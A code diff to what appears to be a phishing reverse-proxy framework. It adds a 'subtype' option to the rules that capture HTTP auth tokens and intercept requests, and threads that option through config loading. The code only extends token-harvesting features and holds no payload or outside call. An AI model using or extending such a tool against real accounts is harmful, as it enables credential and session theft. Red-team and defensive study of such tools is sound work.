@@ -52,6 +52,7 @@ type HttpAuthToken struct {
 	path   *regexp.Regexp
 	name   string
 	header string
+	subtype   string
 }
 
 type PhishletVersion struct {
@@ -122,6 +123,7 @@ type Intercept struct {
 	http_status int            `mapstructure:"http_status"`
 	body        string         `mapstructure:"body"`
 	mime        string         `mapstructure:"mime"`
+	subtype		string		   `mapstructure:"subtype"`
 }
 
 type Phishlet struct {
@@ -180,13 +182,14 @@ type ConfigSubFilter struct {
 }
 
 type ConfigAuthToken struct {
-	Domain *string   `mapstructure:"domain"`
-	Keys   *[]string `mapstructure:"keys"`
-	Type   *string   `mapstructure:"type"`
-	Path   *string   `mapstructure:"path"`
-	Name   *string   `mapstructure:"name"`
-	Search *string   `mapstructure:"search"`
-	Header *string   `mapstructure:"header"`
+	Domain 	*string   `mapstructure:"domain"`
+	Keys   	*[]string `mapstructure:"keys"`
+	Type   	*string   `mapstructure:"type"`
+	Subtype	*string   `mapstructure:"subtype"`
+	Path   	*string   `mapstructure:"path"`
+	Name   	*string   `mapstructure:"name"`
+	Search 	*string   `mapstructure:"search"`
+	Header 	*string   `mapstructure:"header"`
 }
 
 type ConfigPostField struct {
@@ -255,6 +258,7 @@ type ConfigIntercept struct {
 	HttpStatus *int    `mapstructure:"http_status"`
 	Body       *string `mapstructure:"body"`
 	Mime       *string `mapstructure:"mime"`
+	Type	   *string `mapstructure:"type"`
 }
 
 type ConfigPhishlet struct {
@@ -559,7 +563,11 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			if ic.Mime != nil {
 				mime = *ic.Mime
 			}
-			err = p.addIntercept(p.paramVal(*ic.Domain), path_re, *ic.HttpStatus, p.paramVal(body), mime)
+			stype:="request"
+			if ic.Type != nil {
+				stype = *ic.Type
+			}
+			err = p.addIntercept(p.paramVal(*ic.Domain), path_re, *ic.HttpStatus, p.paramVal(body), mime, stype)
 			if err != nil {
 				return err
 			}
@@ -620,8 +628,12 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			if at.Header == nil {
 				return fmt.Errorf("auth_tokens: 'header' not found for http auth token")
 			}
-
-			err := p.addHttpAuthToken(p.paramVal(*at.Domain), p.paramVal(*at.Path), p.paramVal(*at.Name), p.paramVal(*at.Header))
+			
+			stype:="request"
+			if at.Subtype != nil {
+				stype = *at.Subtype
+			}
+			err := p.addHttpAuthToken(p.paramVal(*at.Domain), p.paramVal(*at.Path), p.paramVal(*at.Name), p.paramVal(*at.Header), stype)
 			if err != nil {
 				return err
 			}
@@ -1086,7 +1098,7 @@ func (p *Phishlet) addBodyAuthToken(hostname string, path string, name string, s
 	return nil
 }
 
-func (p *Phishlet) addHttpAuthToken(hostname string, path string, name string, header string) error {
+func (p *Phishlet) addHttpAuthToken(hostname string, path string, name string, header string, subtype string) error {
 	path_re, err := regexp.Compile(path)
 	if err != nil {
 		return err
@@ -1097,6 +1109,7 @@ func (p *Phishlet) addHttpAuthToken(hostname string, path string, name string, h
 		path:   path_re,
 		name:   name,
 		header: header,
+		subtype: 	subtype,
 	}
 
 	return nil
@@ -1127,13 +1140,14 @@ func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string,
 	return nil
 }
 
-func (p *Phishlet) addIntercept(domain string, path *regexp.Regexp, http_status int, body string, mime string) error {
+func (p *Phishlet) addIntercept(domain string, path *regexp.Regexp, http_status int, body string, mime string, subtype string) error {
 	ic := Intercept{
 		domain:      strings.ToLower(domain),
 		path:        path,
 		http_status: http_status,
 		body:        body,
 		mime:        mime,
+		subtype:	 subtype,
 	}
 	p.intercept = append(p.intercept, ic)
 	return nil
